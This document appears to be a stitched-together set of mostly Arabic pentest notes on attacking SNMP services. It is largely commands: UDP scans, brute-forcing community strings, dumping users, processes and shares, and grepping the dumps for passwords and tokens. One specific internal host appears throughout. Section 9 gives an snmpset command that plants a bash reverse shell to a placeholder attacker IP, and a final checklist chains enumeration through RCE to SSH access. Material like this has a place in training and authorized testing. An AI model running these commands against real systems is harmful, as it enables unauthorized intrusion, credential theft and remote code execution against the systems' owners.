dddddddd

**Phase 1:**

bash

```bash
nmap -sU -p 161 -sV <target>
```

**Phase 2:**

bash

```bash
onesixtyone -c <wordlist> <target>
nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=<wordlist> <target>
```

**Phase 3:**

bash

```bash
snmpwalk -v2c -c public <target>
snmpbulkwalk -v2c -c public <target>
snmp-check <target> -c public
```

**Phase 4 (OIDs):**

bash

```bash
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.1        # system info
snmpwalk -v1 -c public <target> 1.3.6.1.4.1.77.1.2.25 # windows users
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.4.2.1.2 # processes
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.6.13.1.3  # tcp ports
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.25.6.3.1.2 # software
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.2.2.1.2   # interfaces
snmpwalk -v1 -c public <target> 1.3.6.1.2.1.4.21.1.1  # routing
```

**Phase 5:**

bash

```bash
snmpwalk -v2c -c public <target> NET-SNMP-EXTEND-MIB::nsExtendObjects
```

**Phase 6:**

bash

```bash
nmap -sU -p 161 --script snmp-* <target>
nmap -sU -p 161 --script snmp-info,snmp-netstat,snmp-processes,snmp-win32-shares,snmp-win32-services <target>
```

**Phase 7:**

bash

```bash
snmpwalk -v2c -c public <target> 1.3.6.1.2.1.55
nmap -6 -sU -p 161 --script snmp-info <target>
```












snmpwalk -v2c -c public 192.168.104.42 .1.3.6.1.4.1.8072.1.3.2
# استخراج بيانات مهمة من SNMP

الـ snmpwalk الأساسي يعطيك بيانات محدودة. لازم تستخدم **MIB strings** بدل الأرقام للحصول على معلومات مفيدة.

## أوامر مهمة جرّبها:

### 1. العمليات الشغّالة (Processes)

bash

```bash
snmpwalk -v1 -c public 192.168.104.42 hrSWRunName
```

### 2. المستخدمين في النظام

bash

```bash
snmpwalk -v1 -c public 192.168.104.42 hrSWRunParameters
```

### 3. المنافذ المفتوحة (TCP/UDP)

bash

```bash
snmpwalk -v1 -c public 192.168.104.42 tcpConnLocalPort
snmpwalk -v1 -c public 192.168.104.42 udpLocalPort
```

### 4. المستخدمين والـ accounts

bash

```bash
snmpwalk -v1 -c public 192.168.104.42 iso.3.6.1.4.1.77.1.2.25
```

### 5. الأوامر المنفّذة / installed software

bash

```bash
snmpwalk -v1 -c public 192.168.104.42 hrSWInstalledName
```

---

## الأداة الأفضل - `snmp-check`:

bash

```bash
snmp-check 192.168.104.42 -c public
```

تعطيك تقرير منظّم يشمل: users, processes, network, storage كل شي بشكل واضح.

---

## ملاحظة من الـ output الحالي:

- الـ community string هي **`public`** فقط (ما لقينا غيرها)
- الـ gateway: **192.168.178.254**
- نظام Linux kernel 5.9.0
  
  




## كل الأوامر اليدوية — SNMP كاملة مع شرح النواتج

---

### 🔹 1. تأكيد إذا SNMP مفتوح

bash

```bash
# أساسي
sudo nmap -sU -p 161 -Pn 192.168.1.1

# مع version detection
sudo nmap -sU -p 161 -sV 192.168.1.1

# subnet كامل
sudo nmap -sU -p 161 192.168.1.0/24
```

**شرح الناتج:**
```
PORT    STATE         SERVICE VERSION
161/udp open          snmp    SNMPv1 server  ← مفتوح ✅
161/udp open|filtered snmp                   ← ممكن مفتوح (UDP مو متأكد)
161/udp closed        snmp                   ← مغلق ❌
```

---

### 🔹 2. Brute Force Community String

bash

```bash
# onesixtyone — الأسرع
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.1
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp-onesixtyone.txt 192.168.1.1

# nmap brute
nmap -sU -p 161 --script snmp-brute 192.168.1.1 \
  --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt

# يدوي بـ bash
while read c; do
  snmpwalk -v1 -c $c 192.168.1.1 >/dev/null 2>&1 && echo "[+] VALID: $c"
done < /usr/share/seclists/Discovery/SNMP/snmp.txt
```

**شرح الناتج:**
```
192.168.1.1 [public]    ← community string = public ✅
192.168.1.1 [security]  ← community string مخصص ✅✅
192.168.1.1 [private]   ← community string = private ✅
# لو ما طلع شي = community string مو في الـ wordlist
```

نعم بالتأكيد، community string تقدر تكون أي كلمة يحددها المسؤول.

---

### أمثلة شائعة تلاقيها

```
public      ← الافتراضي الأكثر شيوعاً
private     ← الافتراضي الثاني
security    ← مخصص
internal    ← مخصص
manager     ← مخصص
admin       ← مخصص
secret      ← مخصص
community   ← مخصص
network     ← مخصص
monitor     ← مخصص
```

### عشان كذا نستخدم wordlist

bash

```bash
# onesixtyone يجرب كل كلمة في الـ wordlist
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 192.168.1.1
```

الـ wordlist تحتوي مئات الكلمات الشائعة، لو الـ community string موجودة فيها يرجعلك:
```
192.168.1.1 [public]    ← لقاها
192.168.1.1 [security]  ← لقاها
192.168.1.1 [manager]   ← لقاها
```

لو ما رجع شي = الـ community string مو في الـ wordlist أو SNMP مغلق.

---

### 🔹 3. Enumeration الأساسية

bash

```bash
# snmpwalk v1
snmpwalk -v1 -c public 192.168.1.1

# snmpwalk v2c — كل شي
snmpwalk -v2c -c public 192.168.1.1 .

# snmpbulkwalk — الأسرع
snmpbulkwalk -v2c -c public 192.168.1.1 .

# snmpbulkwalk مع زيادة السرعة + حفظ
snmpbulkwalk -c public -v2c -Cr1000 192.168.1.1 . > snmp.txt

# snmp-check — أوضح للقراءة
snmp-check 192.168.1.1 -c public
snmp-check 192.168.1.1 -c public -v 2c
```

---

### 🔹 4. OIDs المهمة

bash

```bash
# معلومات النظام
snmpwalk -v1 -c public 192.168.1.1 .1.3.6.1.2.1.1.1    # System Description
snmpwalk -v1 -c public 192.168.1.1 .1.3.6.1.2.1.1.5    # Hostname

# اليوزرات (Windows)
snmpwalk -v1 -c public 192.168.1.1 1.3.6.1.4.1.77.1.2.25

# الـ processes الشغالة
snmpwalk -v1 -c public 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2

# مسارات الـ processes
snmpwalk -v1 -c public 192.168.1.1 1.3.6.1.2.1.25.4.2.1.4

# البرامج المثبتة
snmpwalk -v1 -c public 192.168.1.1 1.3.6.1.2.1.25.6.3.1.2

# البورتات المفتوحة TCP
snmpwalk -v1 -c public 192.168.1.1 1.3.6.1.2.1.6.13.1.3

# الـ shares (Windows)
snmpwalk -v1 -c public 192.168.1.1 1.3.6.1.4.1.77.1.2.27

# Storage
snmpwalk -v1 -c public 192.168.1.1 1.3.6.1.2.1.25.2.3.1.4
```

---

### 🔹 5. Nmap SNMP Scripts

bash

```bash
# كل السكريبتات
nmap -sU -p 161 --script snmp-* 192.168.1.1

# محددة
nmap -sU -p 161 --script=snmp-info 192.168.1.1
nmap -sU -p 161 --script=snmp-sysdescr 192.168.1.1
nmap -sU -p 161 --script=snmp-processes 192.168.1.1
nmap -sU -p 161 --script=snmp-netstat 192.168.1.1
nmap -sU -p 161 --script=snmp-win32-shares 192.168.1.1
nmap -sU -p 161 --script=snmp-win32-services 192.168.1.1
```

---

### 🔹 6. البحث في الناتج عن Credentials

bash

```bash
# حفظ كل شي أول
snmpbulkwalk -c public -v2c -Cr1000 192.168.1.1 . > snmp.txt

# البحث
cat snmp.txt | grep -i "pass"
cat snmp.txt | grep -i "user"
cat snmp.txt | grep -i "login"
cat snmp.txt | grep -i "cred"
cat snmp.txt | grep -i "secret"
cat snmp.txt | grep -i "key"
cat snmp.txt | grep -i "token"

# البحث عن شكل user:pass
cat snmp.txt | grep -E "\w+:\w+"

# قراءة تدريجية
cat snmp.txt | more
```

---

### 🔹 7. شرح الناتج بالتفصيل

bash

```bash
# ناتج System Description
SNMPv2-MIB::sysDescr.0 = STRING: Linux target 4.15.0 #1 SMP
#                                 ↑ Linux أو Windows = fingerprint مهم

SNMPv2-MIB::sysName.0 = STRING: target.local
#                                ↑ hostname الجهاز

SNMPv2-MIB::sysUpTime.0 = Timeticks: (12345) 0:02:03.45
#                                      ↑ وقت تشغيل الجهاز

# ناتج Processes
HOST-RESOURCES-MIB::hrSWRunName.1    = STRING: "init"
HOST-RESOURCES-MIB::hrSWRunName.423  = STRING: "apache2"      ← web server شغال
HOST-RESOURCES-MIB::hrSWRunName.891  = STRING: "mysqld"       ← database شغال
HOST-RESOURCES-MIB::hrSWRunName.1205 = STRING: "sshd"         ← SSH شغال
HOST-RESOURCES-MIB::hrSWRunName.2341 = STRING: "python3 app.py --password=secret123"
#                                                               ↑ credentials ✅✅

# ناتج اليوزرات (Windows)
SNMPv2-SMI::enterprises.77.1.2.25.1.1.3 = STRING: "Administrator"
SNMPv2-SMI::enterprises.77.1.2.25.1.1.4 = STRING: "Guest"
SNMPv2-SMI::enterprises.77.1.2.25.1.1.5 = STRING: "john"       ← يوزر مخصص ✅
SNMPv2-SMI::enterprises.77.1.2.25.1.1.6 = STRING: "svc_backup"  ← service account ✅

# ناتج البورتات المفتوحة
SNMPv2-MIB::tcpConnLocalPort.0.0.0.0.21  = INTEGER: 21   ← FTP مفتوح
SNMPv2-MIB::tcpConnLocalPort.0.0.0.0.22  = INTEGER: 22   ← SSH مفتوح
SNMPv2-MIB::tcpConnLocalPort.0.0.0.0.80  = INTEGER: 80   ← HTTP مفتوح
SNMPv2-MIB::tcpConnLocalPort.0.0.0.0.8080 = INTEGER: 8080 ← port إضافي ✅✅

# ناتج البرامج المثبتة
HOST-RESOURCES-MIB::hrSWInstalledName.1  = STRING: "openssh-server 7.9"
HOST-RESOURCES-MIB::hrSWInstalledName.2  = STRING: "apache2 2.4.38"
HOST-RESOURCES-MIB::hrSWInstalledName.3  = STRING: "php7.3"
HOST-RESOURCES-MIB::hrSWInstalledName.4  = STRING: "mysql-server 5.7"  ← إصدار قديم = ثغرات

# ناتج Shares (Windows)
SNMPv2-SMI::enterprises.77.1.2.27.1.1 = STRING: "ADMIN$"
SNMPv2-SMI::enterprises.77.1.2.27.1.2 = STRING: "C$"
SNMPv2-SMI::enterprises.77.1.2.27.1.3 = STRING: "IPC$"
SNMPv2-SMI::enterprises.77.1.2.27.1.4 = STRING: "BackupShare"  ← share مخصص ✅✅
```

---

### 🔹 8. شرح ناتج snmp-check

bash

```bash
snmp-check 192.168.1.1 -c public
```

```
[*] System information:
  Host IP address      : 192.168.1.1
  Hostname             : target.local        ← اسم الجهاز
  Description          : Linux target 4.15.0 ← نوع الـ OS
  Contact              : admin@company.com   ← email المسؤول
  Location             : Server Room         ← الموقع

[*] User accounts:                           ← اليوزرات مباشرة
  john
  service_account
  administrator

[*] Processes:                               ← الـ processes
  python3 /opt/app/run.py --db-pass=Summer2024  ← credentials ✅✅

[*] Network interfaces:
  lo        127.0.0.1
  eth0      192.168.1.1    ← IP
  eth1      10.10.10.5     ← network داخلي ✅ (pivot)

[*] Network IP:
  10.10.10.0/24            ← subnet داخلي = هدف pivot

[*] Routing information:
  0.0.0.0/0  via 192.168.1.254  ← الـ gateway
```

---

### 🔹 9. RCE عبر EXTEND-MIB

bash

```bash
# تأكيد إذا مفعّل
snmpwalk -v2c -c public 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendObjects

# تنفيذ reverse shell
snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private 192.168.1.1 \
  'nsExtendStatus."rev"' = createAndGo \
  'nsExtendCommand."rev"' = /bin/bash \
  'nsExtendArgs."rev"' = '-c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'

# قراءة الناتج
snmpwalk -v2c -c private 192.168.1.1 NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

---

### الخطوات بالترتيب
```
1️⃣  nmap -sU -p 161         → تأكيد مفتوح
2️⃣  onesixtyone             → إيجاد community string
3️⃣  snmpbulkwalk > snmp.txt → dump كل شي
4️⃣  snmp-check              → قراءة واضحة
5️⃣  grep pass/user/cred     → البحث عن credentials
6️⃣  OIDs محددة              → يوزرات/processes/بورتات
7️⃣  EXTEND-MIB              → محاولة RCE
8️⃣  ssh بالـ credentials    → Initial Access
```















